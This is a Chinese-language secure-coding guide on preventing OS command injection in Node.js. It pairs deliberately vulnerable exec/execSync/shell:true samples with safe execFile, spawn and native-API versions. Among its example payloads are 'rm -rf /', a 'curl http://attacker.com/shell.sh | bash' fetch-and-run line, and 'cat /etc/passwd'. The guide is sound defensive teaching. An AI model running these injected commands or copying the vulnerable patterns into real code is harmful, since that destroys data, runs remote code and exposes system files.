# 防范 OS 命令注入安全编码规范

## 什么是 OS 命令注入

OS 命令注入是指应用将用户输入拼接到操作系统命令字符串中，攻击者通过注入 Shell 元字符（`;`、`|`、`&&`、`` ` ``、`$(...)`）来追加或替换执行任意系统命令，获得服务器控制权。

**典型攻击场景1 —— exec 拼接用户输入**

```
输入: filename = "report.pdf; rm -rf /"
构造: exec("convert report.pdf; rm -rf /")
```
在执行转换命令的同时，删除服务器根目录所有文件。

**典型攻击场景2 —— 反引号/命令替换**

```
输入: host = "`curl http://attacker.com/shell.sh | bash`"
构造: exec(`ping ${host}`)
```
通过命令替换下载并执行远程恶意脚本。

## 漏洞示例（禁止使用）

### 示例1（危险）：exec 拼接用户输入

```typescript
import { exec } from 'child_process';

// 危险：用户控制的文件名被拼入命令字符串
app.post('/convert', (req, res) => {
  const filename = req.body.filename;
  exec(`convert ${filename} output.png`, (err, stdout) => {
    res.send(stdout);
  });
});
```

### 示例2（危险）：execSync 拼接模板字符串

```typescript
import { execSync } from 'child_process';

// 危险：使用模板字符串拼接，Shell 解释器会处理元字符
function ping(host: string) {
  return execSync(`ping -c 4 ${host}`);
}
// 攻击：host = "127.0.0.1; cat /etc/passwd"
```

### 示例3（危险）：shell: true 配合用户输入

```typescript
import { spawn } from 'child_process';

// 危险：shell: true 会通过 /bin/sh 解释命令，等同于 exec
spawn('grep', [userPattern, logFile], { shell: true });
```

## 安全编码示例（推荐）

### 示例1：使用 execFile 替代 exec（参数分离）

```typescript
import { execFile } from 'child_process';
import path from 'path';

// 安全：execFile 不通过 Shell，参数作为数组传递，不会被解释
app.post('/convert', (req, res) => {
  const filename = req.body.filename;

  // 额外校验：只允许字母、数字、连字符、点
  if (!/^[\w\-]+\.(pdf|docx)$/.test(filename)) {
    return res.status(400).send('非法文件名');
  }

  const safePath = path.resolve('/uploads', filename);
  if (!safePath.startsWith('/uploads/')) {
    return res.status(400).send('非法路径');
  }

  execFile('convert', [safePath, 'output.png'], (err, stdout) => {
    if (err) return res.status(500).send('转换失败');
    res.send(stdout);
  });
});
```

### 示例2：spawn 参数数组（不使用 shell）

```typescript
import { spawn } from 'child_process';

// 安全：spawn 默认不启动 Shell，参数作为独立元素传入
function ping(host: string) {
  // 白名单：只允许合法 IP 或域名格式
  if (!/^[a-zA-Z0-9.\-]+$/.test(host)) {
    throw new Error('非法主机名');
  }

  const proc = spawn('ping', ['-c', '4', host]); // 不传 { shell: true }
  return proc;
}
```

### 示例3：优先使用 Node.js 原生 API 替代 Shell 命令

```typescript
import fs from 'fs/promises';
import path from 'path';

// 安全：文件操作直接使用 fs 模块，完全避免 Shell 调用
async function readLogFile(filename: string) {
  const safePath = path.resolve('/var/log/app', filename);
  if (!safePath.startsWith('/var/log/app/')) {
    throw new Error('路径越界');
  }
  return fs.readFile(safePath, 'utf-8');
}
```

## 核心原则总结

- **参数分离**：使用 `execFile` 或 `spawn`（不带 `shell: true`），参数以数组形式传递，绝不拼接命令字符串
- **避免 exec / shell: true**：这两种方式都会将参数交给 Shell 解释，用户输入中的元字符会被执行
- **优先原生 API**：文件操作用 `fs`，HTTP 请求用 `fetch`/`axios`，压缩用 `zlib`，尽量避免调用外部命令
- **严格白名单**：若必须执行外部命令，对可变部分（文件名、主机名）用正则白名单过滤，拒绝非法字符
